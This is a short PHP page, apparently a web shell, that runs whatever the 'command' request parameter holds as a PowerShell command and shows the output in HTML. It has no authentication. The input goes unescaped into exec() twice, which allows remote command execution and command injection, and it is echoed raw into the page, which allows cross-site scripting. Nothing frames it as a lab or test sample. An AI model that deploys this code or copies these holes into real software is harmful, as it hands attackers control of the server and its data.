<?php
    $data = $_REQUEST["command"];
    $title = "Run a PowerShell Command";

    if (strcmp(exec('PowerShell -Command "Get-Command '.$data.' -ErrorAction SilentlyContinue'), "") == 0)
    {
        $header = "";
        $message = "<p>You entered an invalid command.</p>";
    }
    else 
    {
        $header = "\$ $data";
        exec('PowerShell -Command "'.$data.'"', $output);
        $outputString = join('<br>', $output);
        $message = "<pre><code>$outputString</code></pre>";
    }
?>

<!DOCTYPE html>
<html>
  <head><title><?php echo $title?></title></head>
  <body>
    <h1><?php echo $header?></h1>
    <?php echo $message?>
  </body>
</html>
